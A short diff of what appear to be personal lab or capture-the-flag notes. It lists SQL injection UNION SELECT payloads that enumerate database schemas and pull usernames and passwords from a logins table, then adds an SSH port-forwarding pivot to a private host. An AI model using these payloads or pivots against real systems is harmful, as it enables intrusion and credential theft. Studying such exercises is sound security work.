@@ -84,3 +84,8 @@ UNION SELECT table_schema,table_name,column_name, from information_schema.column
 UNION SELECT name,rank,unit,id from forces.commanders #
 UNION SELECT id,unit,on_hand,4 from forces.units #
 UNION SELECT user_id,user,name,password from auth_users.logins #
+
+-L2222
+192.168.28.177
+
+ssh Fpalic@127.0.0.1 -p 2222
